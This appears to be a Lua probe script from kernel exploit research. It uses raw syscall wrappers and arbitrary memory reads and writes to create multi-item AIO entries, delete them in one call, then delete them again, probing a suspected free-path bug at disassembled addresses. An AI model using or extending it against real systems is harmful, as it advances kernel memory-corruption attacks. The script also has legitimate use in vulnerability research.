-- CRASH_CLASS: MODERATE
-- PROBE 528a: delete a multi-item aio entry in one call
--
-- Context: every race so far deleted ids one at a time (count=1). The 13.60
-- delete body branches on the *entry's* count field at 0x3afea3
-- (cmp r8w,1 / jne 0x3affbc), and the multi branch frees the work item at
-- 0x3affef instead of the context at 0x3afee8. A create with flags 0x1000
-- makes one entry holding count items (504a proved ids base+i*0x10000), so
-- the multi branch is reachable from Lua without threads.
--
-- This probe creates a 4-item entry, polls and deletes each item alone, then
-- deletes all four in one call and repeats, printing every status.

print("=== PROBE 528a: AIO MULTI DELETE ===")
print("")
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end

local sc669, sc662, sc664 = mk(669), mk(662), mk(664)
local DATA = memory.alloc(0x100)
local OUT = memory.alloc(0x40)
for i = 0, 0xFC, 4 do wd(DATA + i, 0) end
for i = 0, 0x3C, 4 do wd(OUT + i, 0) end

local function create(count)
    wd(OUT, 0)
    local r = sc669(uint64(0x1001), uint64(N(DATA)), uint64(count), uint64(1), uint64(N(OUT)))
    local ob = rd(N(OUT)) or 0
    if ob == 0 then ob = N(r) % 0x10000 end
    return N(r), ob
end
local function poll(ids, n, out)
    local r = sc664(uint64(N(ids)), uint64(n), uint64(N(out)))
    return N(r)
end
local function del(ids, n, out)
    local r = sc662(uint64(N(ids)), uint64(n), uint64(N(out)))
    return N(r)
end
local function ids_of(base, count)
    local a = memory.alloc(0x40)
    for i = 0, count - 1 do
        wd(a + i * 4, (base + i * 0x10000) % 0x100000000)
    end
    return a
end
local function statuses(out, count)
    local t = {}
    for i = 0, count - 1 do
        t[#t + 1] = string.format("%08X", rd(N(out) + i * 4) or 0)
    end
    return table.concat(t, " ")
end

local ret, base = create(4)
print(string.format("[A] create count=4 ret=%d base=%08X", ret, base))
local allids = ids_of(base, 4)
local one = memory.alloc(0x10)
local res = memory.alloc(0x40)
for i = 0, 3 do
    wd(one, (base + i * 0x10000) % 0x100000000)
    wd(res, 0)
    local pr = poll(one, 1, res)
    print(string.format("    poll[%d] id=%08X ret=%d st=%s", i, N(rd(one)), pr, statuses(res, 1)))
end
wd(res, 0)
local dr = del(allids, 4, res)
print(string.format("[B] delete all 4 one call ret=%d st=%s", dr, statuses(res, 4)))
wd(res, 0)
dr = del(allids, 4, res)
print(string.format("[C] delete again ret=%d st=%s", dr, statuses(res, 4)))

base, ret = create(4)
print(string.format("[D] create count=4 ret=%d base=%08X", ret, base))
allids = ids_of(base, 4)
for i = 0, 3 do
    wd(one, (base + i * 0x10000) % 0x100000000)
    poll(one, 1, res)
end
local two = ids_of(base, 2)
wd(res, 0)
dr = del(two, 2, res)
print(string.format("[E] delete first 2 ret=%d st=%s", dr, statuses(res, 2)))
wd(res, 0)
dr = del(two, 2, res)
print(string.format("[F] delete first 2 again ret=%d st=%s", dr, statuses(res, 2)))
wd(res, 0)
local lasttwo = memory.alloc(0x10)
wd(N(lasttwo), (base + 2 * 0x10000) % 0x100000000)
wd(N(lasttwo) + 4, (base + 3 * 0x10000) % 0x100000000)
dr = del(lasttwo, 2, res)
print(string.format("[G] delete last 2 ret=%d st=%s", dr, statuses(res, 2)))

print("[H] pid=" .. N(native.fcall_with_rax(syscall.pipe.fn_addr, 20)))
print("=== DONE ===")
